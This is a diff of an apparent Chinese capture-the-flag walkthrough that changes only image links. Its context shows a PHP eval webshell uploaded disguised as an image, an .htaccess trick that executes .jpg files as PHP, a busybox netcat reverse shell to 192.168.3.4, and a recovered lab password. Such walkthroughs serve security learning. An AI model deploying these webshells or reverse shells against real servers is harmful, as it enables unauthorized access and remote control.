@@ -1,5 +1,5 @@
 
-![[Pasted image 20260124195510.png]]
+![](images/Pasted%20image%2020260124195510.png)
 
 
 # 1.信息搜索
@@ -91,16 +91,16 @@ Target: http://tmpfile.dsz/
 ```
 
 看到有`uploads`，发现111大佬的头像,这里明示了需要上传图片作为突破点
-![[Pasted image 20260124200918.png]]
+![](images/Pasted%20image%2020260124200918.png)
 ## 方法一
 将`2.php`另存为`2.png`，上传后用蚁剑连接
 ```php
 <?php @eval($_POST['cmd']);?>
 ```
 
-![[Pasted image 20260124205034.png]]
+![](images/Pasted%20image%2020260124205034.png)
 `/opt`下发现密码
-![[Pasted image 20260124204905.png]]
+![](images/Pasted%20image%2020260124204905.png)
 `Eecho:2VQzte2RBr8p8MuOA0Gw2Sum`
 
 
@@ -115,12 +115,12 @@ AddType application/x-httpd-php .jpg
 
 
 
-![[Pasted image 20260125193323.png]]
+![](images/Pasted%20image%2020260125193323.png)
 然后上传`nc.jpg` 即可实现反弹, 将`nc.php`另存为`nc.jpg`即可
 ```php
 <?php exec("busybox nc 192.168.3.4 1111 -e /bin/bash"); ?>
 ```
-![[Pasted image 20260125193634.png]]
+![](images/Pasted%20image%2020260125193634.png)
 
 
 
@@ -158,7 +158,7 @@ ps -ef
 #或者
 ss -tlnup
 ```
-![[Pasted image 20260125190812.png]]
+![](images/Pasted%20image%2020260125190812.png)
 
 # 3.提权
 ```bash
